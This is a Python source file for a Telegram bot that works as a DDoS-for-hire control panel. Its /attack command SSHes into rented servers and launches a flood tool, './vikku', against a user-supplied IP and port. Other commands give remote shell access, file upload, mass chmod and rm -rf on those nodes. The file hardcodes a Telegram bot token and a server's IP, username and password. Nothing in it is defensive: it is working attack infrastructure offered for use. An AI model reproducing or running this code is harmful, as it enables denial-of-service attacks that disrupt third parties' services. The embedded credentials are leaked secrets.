import random
import threading
import paramiko
import json
import requests
import time
import os

TOKEN = "7338347553:AAEFxDXVAUuZREXNzx1enS1fqz1hEj2gwkM"  # Replace with your bot token
API_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_IDS = [6882674372]  # Replace with your Admin IDs
CONFIG_FILE = "config.json"
USERS_FILE = "users.json"  # File to store authorized users

# Global variables for configuration
DEFAULT_TIME_DURATION = 120  # Default attack duration in seconds
DEFAULT_THREADS = 1200       # Default number of threads
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')
user_attack_endtimes = {}  # Dictionary to store attack end times per user

# Dictionary to store temporary data for file uploads
user_data = {}

def load_users():
    """Load authorized users from file."""
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r") as f:
                return json.load(f)
    except:
        pass
    return []

def save_users(users):
    """Save authorized users to file."""
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=4)

def is_admin(chat_id):
    """Check if the user is an admin."""
    return chat_id in ADMIN_IDS

def is_authorized(chat_id):
    """Check if the user is authorized (admin or in users list)."""
    return is_admin(chat_id) or str(chat_id) in load_users()

def generate_config_file():
    """Generate a default config file if it doesn't exist."""
    default_config = {
        "VPS_LIST": [
            {
                "ip": "66.135.1.87",
                "user": "master_tsakxsvdjh",
                "password": "2eExFfzA8tKw",
                "busy": False
            }
        ]
    }

    if not os.path.exists("config.json"):
        with open("config.json", "w") as file:
            json.dump(default_config, file, indent=4)
        print("✅ config.json created with default values.")
    else:
        print("⚠️ config.json already exists. No changes were made.")

generate_config_file()

def save_config():
    """Save the configuration to the config file."""
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file, indent=4)

# Load VPS details from config.json
with open(CONFIG_FILE, "r") as file:
    config = json.load(file)

# Ensure each VPS has a 'busy' key initialized to False
VPS_LIST = config["VPS_LIST"]
for vps in VPS_LIST:
    if "busy" not in vps:
        vps["busy"] = False

save_config()
users = load_users()

def send_message(chat_id, text):
    """Send a message to the user using Telegram Bot API."""
    url = f"{API_URL}/sendMessage"
    params = {"chat_id": chat_id, "text": text}
    requests.post(url, params=params)

def get_updates(offset=None):
    """Get new updates (messages) from Telegram."""
    url = f"{API_URL}/getUpdates"
    params = {"timeout": 10, "offset": offset}
    response = requests.get(url, params=params)
    return response.json()

def check_vps_status():
    """Check the status of all VPS and send notifications for down VPS."""
    status_list = []
    failed_vps_list = []
    for vps in VPS_LIST:
        ip, user, password = vps["ip"], vps["user"], vps["password"]
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=password, timeout=5)
            ssh.close()
            status_list.append(f"🟢 `{ip}` **RUNNING** ✅")
        except:
            status_list.append(f"🔴 `{ip}` **DOWN** ❌")
            failed_vps_list.append(ip)
    
    if failed_vps_list:
        failed_vps_message = "\n".join([f"🔴 `{ip}` **DOWN** ❌" for ip in failed_vps_list])
        for admin_id in ADMIN_IDS:
            send_message(admin_id, f"🚨 **ALERT: Some VPS are DOWN!**\n{failed_vps_message}")
    
    return "\n".join(status_list)

def get_available_vps():
    """Find and return an available VPS from the VPS_LIST."""
    for vps in VPS_LIST:
        if not vps["busy"]:
            return vps
    return None

def handle_start(chat_id):
    """Handle the /start command."""
    welcome_msg = (
        "⚡️ *WELCOME TO THE STORM CORE* ⚡️\n\n"
        "🔥 This bot is your gateway to launching high-intensity stress tests.\n"
        "🧠 _Precision-controlled._ 💣 _Maximum disruption._\n"
        "🔒 Access is restricted. Type /help to see available commands.\n\n"
        "⚠️ Use responsibly. Unauthorized access is monitored."
    )
    send_message(chat_id, welcome_msg)

def handle_attack(chat_id, command):
    """Handle the /attack command."""
    if not is_authorized(chat_id):
        send_message(chat_id, "🚫 **You are not authorized to use this command.**")
        return

    command = command.split()
    if len(command) != 5:
        send_message(chat_id, "⚠️ Usage: /attack <IP> <PORT> <TIME> <THREADS>")
        return

    target, port, time_duration, threads = command[1], command[2], command[3], command[4]
    if not target.startswith(valid_ip_prefixes):
        send_message(chat_id, "🚫 Invalid target IP prefix. Attack denied.")
        return

    try:
        port = int(port)
        time_duration = int(time_duration)
        threads = int(threads)
    except ValueError:
        send_message(chat_id, "❌ Error: Port, time, and threads must be integers!")
        return

    if time_duration > 240:
        send_message(chat_id, "🚫 Maximum duration is 240 seconds!")
        return

    if threads > 5000:
        send_message(chat_id, "🚫 Maximum threads is 5000!")
        return

    selected_vps = get_available_vps()
    if not selected_vps:
        send_message(chat_id, "🚫 All VPS are busy, try again later!")
        return

    selected_vps["busy"] = True
    attack_msg = (
        f"🚀 *LAUNCH CONFIRMED!*\n\n"
        f"🎯 *Target:* `{target}`\n"
        f"🔧 *Port:* `{port}`\n"
        f"⏱ *Duration:* `{time_duration}` seconds\n"
        f"🧵 *Threads:* `{threads}`\n"
        f"🧠 *Node:* `{selected_vps['ip']}`\n\n"
        f"🔥 *Status:* _Engaging payload..._"
    )
    send_message(chat_id, attack_msg)

    user_attack_endtimes[chat_id] = time.time() + time_duration
    attack_thread = threading.Thread(target=execute_attack, args=(selected_vps, target, port, time_duration, threads, chat_id))
    attack_thread.start()

def handle_when(chat_id):
    """Handle the /when command to check remaining attack time."""
    if chat_id not in user_attack_endtimes:
        send_message(chat_id, "🕒 No active attack found.")
        return

    remaining = int(user_attack_endtimes[chat_id] - time.time())
    if remaining > 0:
        send_message(chat_id, f"⏳ Time left for current attack: {remaining} seconds.")
    else:
        send_message(chat_id, "✅ Your last attack has finished.")
        del user_attack_endtimes[chat_id]

def execute_attack(vps, target, port, duration, threads, chat_id):
    """Execute an attack on the target using the selected VPS."""
    ip, user, password = vps["ip"], vps["user"], vps["password"]
    attack_command = f"./vikku {target} {port} {duration} {threads}"

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=user, password=password)

        ssh.exec_command(attack_command)
        ssh.close()
        time.sleep(duration)
        vps["busy"] = False
        send_message(chat_id, f"✅ *Attack Completed!*\n📍 From `{ip}` on `{target}`.\n\n⏱ Duration: {duration}s\n🧵 Threads: {threads}")
    except Exception as e:
        vps["busy"] = False
        send_message(chat_id, f"❌ *Attack Error on `{ip}`:* {str(e)}")

# [Rest of the functions remain unchanged...]

def handle_cvps(chat_id):
    """Handle the /cvps command."""
    if not is_authorized(chat_id):
        send_message(chat_id, "?? **You are not authorized to use this command.**")
        return
        
    send_message(chat_id, "⏳ Checking VPS status...")
    status_message = check_vps_status()
    send_message(chat_id, f"?? VPS STATUS:\n{status_message}")

def handle_avps(chat_id, command):
    """Handle the /avps command."""
    if not is_admin(chat_id):
        send_message(chat_id, "?? This command is restricted to admins only.")
        return

    command = command.split()
    if len(command) != 4:
        send_message(chat_id, "⚠️ **Usage: /avps <IP> <USER> <PASSWORD>")
        return

    ip, user, password = command[1], command[2], command[3]
    VPS_LIST.append({"ip": ip, "user": user, "password": password, "busy": False})
    save_config()
    send_message(chat_id, f"✅ VPS {ip} added!✨")

def handle_adduser(chat_id, command):
    """Handle the /adduser command to authorize new users."""
    if not is_admin(chat_id):
        send_message(chat_id, "?? This command is restricted to admins only.")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage: /adduser <USER_ID>")
        return

    user_id = command[1]
    users = load_users()
    
    if user_id in users:
        send_message(chat_id, f"⚠️ User {user_id} is already authorized.")
    else:
        users.append(user_id)
        save_users(users)
        send_message(chat_id, f"✅ User {user_id} has been authorized.")
        try:
            send_message(int(user_id), "?? You have been authorized to use this bot!")
        except:
            pass

def handle_removeuser(chat_id, command):
    """Handle the /removeuser command to revoke user access."""
    if not is_admin(chat_id):
        send_message(chat_id, "?? This command is restricted to admins only.")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage: /removeuser <USER_ID>")
        return

    user_id = command[1]
    users = load_users()
    
    if user_id not in users:
        send_message(chat_id, f"⚠️ User {user_id} is not in the authorized list.")
    else:
        users.remove(user_id)
        save_users(users)
        send_message(chat_id, f"✅ User {user_id} has been removed.")
        try:
            send_message(int(user_id), "❌ Your access to this bot has been revoked.")
        except:
            pass

def handle_listusers(chat_id):
    """Handle the /listusers command to show authorized users."""
    if not is_admin(chat_id):
        send_message(chat_id, "?? This command is restricted to admins only.")
        return

    users = load_users()
    if not users:
        send_message(chat_id, "ℹ️ No authorized users.")
    else:
        send_message(chat_id, "?? Authorized Users:\n" + "\n".join(users))

def handle_upload_start(chat_id):
    """Handle the /upload command."""
    if not is_admin(chat_id):
        send_message(chat_id, "??This command is restricted to admins only.")
        return

    send_message(chat_id, "?? Please enter the IP address of the VPS where you want to upload the file:")
    user_data[chat_id] = {"step": "upload_ip"}

def handle_upload_ip(chat_id, ip):
    """Handle the IP address input for file upload."""
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ VPS with IP {ip} not found!")
        return

    # Save the IP address in user_data
    user_data[chat_id] = {"step": "upload_file", "ip": ip}
    send_message(chat_id, "?? **Please upload the file now.**")

def handle_file_upload(chat_id, file_id, file_name):
    """Handle the file upload."""
    if chat_id not in user_data or user_data[chat_id].get("step") != "upload_file":
        send_message(chat_id, "❌ **Please start the upload process using the `/upload` command.**")
        return

    # Get the saved IP address
    ip = user_data[chat_id]["ip"]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        # Get file information
        file_info = requests.get(f"{API_URL}/getFile?file_id={file_id}").json()
        file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_info['result']['file_path']}"
        downloaded_file = requests.get(file_url).content

        # Save the file locally temporarily
        with open(file_name, 'wb') as new_file:
            new_file.write(downloaded_file)

        # Upload the file to the VPS using SCP
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        # Use SCP to upload the file
        scp = ssh.open_sftp()
        scp.put(file_name, f"/{file_name}")  # Upload to /root directory
        scp.close()
        ssh.close()

        # Clean up the local file
        os.remove(file_name)

        send_message(chat_id, f"✅ **File `{file_name}` uploaded successfully to `{ip}`!**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error uploading file to `{ip}`:** {str(e)}")
    finally:
        # Clear the user data
        if chat_id in user_data:
            del user_data[chat_id]

def handle_ls(chat_id, command):
    """Handle the /ls command."""
    if not is_admin(chat_id):
        send_message(chat_id, "?? **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /ls `<IP>`")
        return

    ip = command[1]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        # Execute the `ls -p | grep -v /` command to list only files
        stdin, stdout, stderr = ssh.exec_command("ls -p | grep -v /")
        ls_output = stdout.read().decode().strip()
        ssh.close()

        if ls_output:
            send_message(chat_id, f"?? **Files on `{ip}`:**\n```\n{ls_output}\n```")
        else:
            send_message(chat_id, f"❌ **No files found on `{ip}`.**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing `ls` on `{ip}`:** {str(e)}")

def handle_delete(chat_id, command):
    """Handle the /delete command."""
    if not is_admin(chat_id):
        send_message(chat_id, "?? **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 3:
        send_message(chat_id, "⚠️ **Usage:** /delete `<IP>` `<file_or_directory>`")
        return

    ip, file_or_dir = command[1], command[2]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        # Execute the `rm -rf` command
        stdin, stdout, stderr = ssh.exec_command(f"rm -rf {file_or_dir}")
        error = stderr.read().decode().strip()
        ssh.close()

        if error:
            send_message(chat_id, f"❌ **Error deleting `{file_or_dir}` on `{ip}`:** {error}")
        else:
            send_message(chat_id, f"✅ **Successfully deleted `{file_or_dir}` on `{ip}`.**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing `delete` on `{ip}`:** {str(e)}")

def handle_terminal(chat_id, command):
    """Handle the /terminal command."""
    if not is_admin(chat_id):
        send_message(chat_id, "?? **This command is restricted to admins only.**")
        return

    command = command.split(maxsplit=2)
    if len(command) != 3:
        send_message(chat_id, "⚠️ **Usage:** /terminal `<IP>` `<COMMAND>`")
        return

    ip, terminal_command = command[1], command[2]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        stdin, stdout, stderr = ssh.exec_command(terminal_command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        if error:
            send_message(chat_id, f"❌ **Error executing command on `{ip}`:**\n```\n{error}\n```")
        else:
            send_message(chat_id, f"✅ **Command output from `{ip}`:**\n```\n{output}\n```")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing command on `{ip}`:** {str(e)}")

def handle_chmod(chat_id, command):
    """Handle the /chmod command."""
    if not is_admin(chat_id):
        send_message(chat_id, "?? **This command is restricted to admins only.**")
        return

    command = command.split()
    if len(command) != 2:
        send_message(chat_id, "⚠️ **Usage:** /chmod `<IP>`")
        return

    ip = command[1]
    vps = next((vps for vps in VPS_LIST if vps["ip"] == ip), None)
    if not vps:
        send_message(chat_id, f"❌ **VPS with IP `{ip}` not found!**")
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"], timeout=5)

        # Execute the `chmod +x *` command
        stdin, stdout, stderr = ssh.exec_command("chmod +x *")
        error = stderr.read().decode().strip()
        ssh.close()

        if error:
            send_message(chat_id, f"❌ **Error executing `chmod +x *` on `{ip}`:** {error}")
        else:
            send_message(chat_id, f"✅ **Successfully executed `chmod +x *` on `{ip}`.**")
    except Exception as e:
        send_message(chat_id, f"❌ **Error executing `chmod +x *` on `{ip}`:** {str(e)}")

def handle_help(chat_id):
    """Handle the /help command."""
    help_text = """
?? *Bot Commands:*

*Admin Commands:*
`/adduser <user_id>` - Authorize a new user
`/removeuser <user_id>` - Remove user authorization
`/listusers` - List all authorized users
`/avps <ip> <user> <password>` - Add a new VPS
`/upload` - Upload a file to a VPS
`/ls <ip>` - List files on a VPS
`/delete <ip> <file>` - Delete a file on a VPS
`/terminal <ip> <command>` - Execute a command on a VPS
`/chmod <ip>` - Make all files executable on a VPS

*User Commands:*
`/attack <ip> <port> <time> <threads>` - Start an attack
`/cvps` - Check VPS status
`/when` - इसे पता चलेगा कि कितना दूसरा बचा है अटैक खत्म होने पर

⚠️ *Note:* Some commands are restricted to admins only.
"""
    send_message(chat_id, help_text)

def main():
    offset = None
    while True:
        updates = get_updates(offset)
        if "result" in updates:
            for update in updates["result"]:
                offset = update["update_id"] + 1
                message = update.get("message")
                if message:
                    chat_id = message["chat"]["id"]
                    text = message.get("text")
                    
                    if text and text.startswith("/"):
                        command = text.split()[0]
                        if command == "/attack":
                            handle_attack(chat_id, text)
                        elif command == "/cvps":
                            handle_cvps(chat_id)
                        elif command == "/avps":
                            handle_avps(chat_id, text)
                        elif command == "/upload":
                            handle_upload_start(chat_id)
                        elif command == "/ls":
                            handle_ls(chat_id, text)
                        elif command == "/delete":
                            handle_delete(chat_id, text)
                        elif command == "/terminal":
                            handle_terminal(chat_id, text)
                        elif command == "/chmod":
                            handle_chmod(chat_id, text)
                        elif command == "/adduser":
                            handle_adduser(chat_id, text)
                        elif command == "/removeuser":
                            handle_removeuser(chat_id, text)
                        elif command == "/listusers":
                            handle_listusers(chat_id)
                        elif command == "/help":
                            handle_help(chat_id)
                        elif command == "/when":
                            handle_when(chat_id)
                        else:
                            send_message(chat_id, (
                                "⚠️ *UNRECOGNIZED SIGNAL DETECTED!*\n\n"
                                "❌ This command is not in my execution list.\n"
                                "🧠 Use /help to view all active protocols.\n"
                                "🔍 _Ensure correct syntax or request admin support._"
                            ))
                    elif "document" in message:
                        file_id = message["document"]["file_id"]
                        file_name = message["document"]["file_name"]
                        handle_file_upload(chat_id, file_id, file_name)
                    elif chat_id in user_data and user_data[chat_id].get("step") == "upload_ip":
                        handle_upload_ip(chat_id, text)
        time.sleep(1)

if __name__ == "__main__":
    main()